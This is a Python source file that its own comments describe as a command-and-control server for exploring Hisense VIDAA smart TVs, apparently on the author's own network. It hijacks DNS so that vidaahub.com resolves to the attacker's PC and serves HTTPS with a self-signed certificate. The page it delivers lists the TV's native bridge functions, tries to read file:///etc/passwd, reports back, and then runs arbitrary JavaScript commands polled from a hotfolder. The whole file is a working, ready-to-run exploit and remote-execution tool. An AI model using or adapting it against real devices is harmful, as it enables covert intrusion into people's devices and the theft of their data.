#
# C&C server for VIDAA exploration.
# - DNS (53): vidaahub.com -> PC_IP, everything else forwarded to UPSTREAM
# - HTTP (80) and HTTPS (443, vidaahub.com cert): bridge page + /cmd + /res
# Control: hotfolder cnd/NNN.js -> JS command for the TV (results -> results.jsonl)
#
# Adjust PC_IP and UPSTREAM to your network.
# Cert: openssl req -x509 -newkey rsa:2048 -keyout vidaahub.com.key -out vidaahub.com.crt -days 365 -nodes -subj "/CN=vidaahub.com"
#
import json, os, socket, socketserver, ssl, sys, threading, time, uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A

PC_IP = "192.168.8.136"          # <- your PC's IP on the LAN
UPSTREAM = ("192.168.8.1", 53)   # <- your router
HERE = os.path.dirname(os.path.abspath(__file__))

pending = {"id": None, "js": None, "event": threading.Event()}
results = []

PAGE = r"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Vidaa Hub</title></head>
<body style="background:#000;color:#0f0;font:22px monospace;padding:20px">
<div id="s">Connecting to Hisense bridge...</div>
<script>
var SID = Math.random().toString(36).slice(2,8);
function say(t){ document.getElementById("s").innerHTML += "<br>"+t; }
function esc(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;"); }

// 1. enumerate bridge functions
var bridge = {};
try {
  var names = Object.getOwnPropertyNames(window);
  var fns = names.filter(function(n){ return /^Hisense_|^HiUtils_|^File|^hi[A-Z]/.test(n); });
  say("bridge functions: " + fns.length);
  fns.forEach(function(n){ bridge[n] = typeof window[n]; });
  say(esc(fns.slice(0,60).join(", ")));
  var syms = Object.getOwnPropertySymbols(window).map(String);
  say("symbols: " + syms.length + " " + esc(syms.slice(0,20).join(",")));
} catch(e){ say("enum err: "+e.message); }

// 2. test XHR file://
var probes = {};
function xhrFile(p){ return new Promise(function(res){ try{
  var x=new XMLHttpRequest(); x.open("GET",p,true);
  x.onreadystatechange=function(){ if(x.readyState===4) res({p:p,status:x.status,len:(x.responseText||"").length,head:(x.responseText||"").slice(0,300)}); };
  x.onerror=function(){ res({p:p,err:"onerror"}); }; x.send(null); }catch(e){ res({p:p,err:e.message}); } }); }

(async function(){
  try{ if(typeof File!=="undefined"){ probes.File_read = String(File.read); probes.File_write = String(File.write); } }catch(e){ probes.ferr=e.message; }
  var x = await xhrFile("file:///etc/passwd");
  probes.xhrPasswd = x;

  await fetch("/res",{method:"POST",body:JSON.stringify({id:-1, ok:true, result:{sid:SID, bridge:bridge, probes:probes}})});
  say("probe sent, waiting for commands...");

  while(true){
    try{
      var r = await fetch("/cmd?sid="+SID, {cache:"no-store"});
      var c = await r.json();
      if(c.id >= 0){
        say("cmd #"+c.id+": "+esc((c.js||"").slice(0,80)));
        var out;
        try{
          out = await (new Function("return (async()=>{ "+c.js+" })()"))();
          await fetch("/res",{method:"POST",body:JSON.stringify({id:c.id, ok:true, result:out===undefined?null:out})});
          say("cmd #"+c.id+" OK");
        }catch(e){
          await fetch("/res",{method:"POST",body:JSON.stringify({id:c.id, ok:false, error:e.message})});
          say("cmd #"+c.id+" ERR: "+esc(e.message));
        }
      } else { await new Promise(function(r2){setTimeout(r2,800);}); }
    }catch(e){ await new Promise(function(r2){setTimeout(r2,1500);}); }
  }
})();
</script></body></html>"""

class Handler(BaseHTTPRequestHandler):
    log_message = lambda self, *a: None
    def do_GET(self):
        if self.path.startswith("/cmd"):
            self.send_response(200); self.send_header("Content-Type","application/json")
            self.send_header("Cache-Control","no-store"); self.end_headers()
            if pending["id"] is not None:
                self.wfile.write(json.dumps({"id":pending["id"],"js":pending["js"]}).encode())
            else:
                self.wfile.write(b'{"id":-1}')
        elif self.path == "/" or self.path.startswith("/?"):
            b = PAGE.encode()
            self.send_response(200); self.send_header("Content-Type","text/html; charset=utf-8")
            self.send_header("Content-Length",str(len(b))); self.send_header("Cache-Control","no-store")
            self.end_headers(); self.wfile.write(b)
        else:
            self.send_response(404); self.end_headers()
    def do_POST(self):
        if self.path == "/res":
            n = int(self.headers.get("Content-Length",0))
            body = self.rfile.read(n)
            try:
                d = json.loads(body.decode(errors="replace"))
                results.append(d)
                with open(os.path.join(HERE, "results.jsonl"), "a", encoding="utf-8") as rf:
                    rf.write(json.dumps(d, ensure_ascii=False) + "\n")
                pending["event"].set()
            except Exception:
                pass
            self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers()
        else:
            self.send_response(404); self.end_headers()

class DNSHandler(socketserver.BaseRequestHandler):
    BLOCKED = ("logs.netflix.com", "nrdp.logs.netflix.com", "nrdp.push.prod.netflix.com",
               "ter-jrnl-eu.vidaahub.com", "ter-jrnl-na.vidaahub.com",
               "telemetry.vidaahub.com", "metrics.vidaahub.com",
               "acr.unruly.co", "doubleclick.net", "pixel.ssai.media",
               "rpt-mntz-azure.vidaahub.com", "rsc-mntz.vidaahub.com")
    def handle(self):
        data, sock = self.request[0], self.request[1]
        try:
            req = DNSRecord.parse(data)
            qname = str(req.q.qname).rstrip('.')
            qt = QTYPE[req.q.qtype]
            if any(qname == b or qname.endswith("." + b) for b in self.BLOCKED):
                reply = DNSRecord(DNSHeader(id=req.header.id, qr=1, aa=1, ra=1), q=req.q)
                if qt == "A":
                    reply.add_answer(RR(qname, QTYPE.A, rdata=A("0.0.0.0"), ttl=60))
                sock.sendto(reply.pack(), self.client_address)
                return
            if qname in ("vidaahub.com", "www.vidaahub.com", "vidiaahub.com", "www.vidiaahub.com"):
                reply = DNSRecord(DNSHeader(id=req.header.id, qr=1, aa=1, ra=1), q=req.q)
                if qt == "A":
                    reply.add_answer(RR(qname, QTYPE.A, rdata=A(PC_IP), ttl=30))
                sock.sendto(reply.pack(), self.client_address)
                return
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(4)
            s.sendto(data, UPSTREAM)
            resp, _ = s.recvfrom(4096); s.close()
            sock.sendto(resp, self.client_address)
        except Exception:
            pass

def console():
    """Hotfolder: cnd/NNN.js -> command JS for the TV. Results -> results.jsonl."""
    cnd = os.path.join(HERE, "cnd")
    os.makedirs(cnd, exist_ok=True)
    done = os.path.join(cnd, "done"); os.makedirs(done, exist_ok=True)
    resf = open(os.path.join(HERE, "results.jsonl"), "a", encoding="utf-8")
    while True:
        files = sorted(f for f in os.listdir(cnd) if f.endswith(".js"))
        if not files or pending["id"] is not None:
            time.sleep(1); continue
        f = files[0]
        try:
            cid = int(f[:-3])
        except ValueError:
            cid = uuid.uuid4().hex[:8]
        js = open(os.path.join(cnd, f), encoding="utf-8").read()
        pending["id"] = cid; pending["js"] = js; pending["event"].clear()
        got = pending["event"].wait(90)
        try: os.rename(os.path.join(cnd, f), os.path.join(done, f))
        except OSError: pass
        pending["id"] = None; pending["js"] = None
        if not got:
            resf.write(json.dumps({"id": cid, "ok": False, "error": "timeout"}) + "\n"); resf.flush()

def main():
    threading.Thread(target=console, daemon=True).start()
    try:
        dns = socketserver.ThreadingUDPServer((PC_IP, 53), DNSHandler)
        dns.allow_reuse_address = True
        threading.Thread(target=dns.serve_forever, daemon=True).start()
        print("[+] DNS on :53", flush=True)
    except Exception as e:
        print("[-] DNS 53:", e, flush=True)
    try:
        h = ThreadingHTTPServer((PC_IP, 80), Handler); h.daemon_threads=True
        threading.Thread(target=h.serve_forever, daemon=True).start()
        print("[+] HTTP on :80", flush=True)
    except Exception as e:
        print("[-] HTTP 80:", e, flush=True)
    try:
        hs = ThreadingHTTPServer((PC_IP, 443), Handler); hs.daemon_threads=True
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=os.path.join(HERE,"vidaahub.com.crt"), keyfile=os.path.join(HERE,"vidaahub.com.key"))
        hs.socket = ctx.wrap_socket(hs.socket, server_side=True)
        threading.Thread(target=hs.serve_forever, daemon=True).start()
        print("[+] HTTPS on :443", flush=True)
    except Exception as e:
        print("[-] HTTPS 443:", e, flush=True)
    print("READY. Waiting for the TV...", flush=True)
    while True: time.sleep(1)

if __name__ == "__main__":
    main()
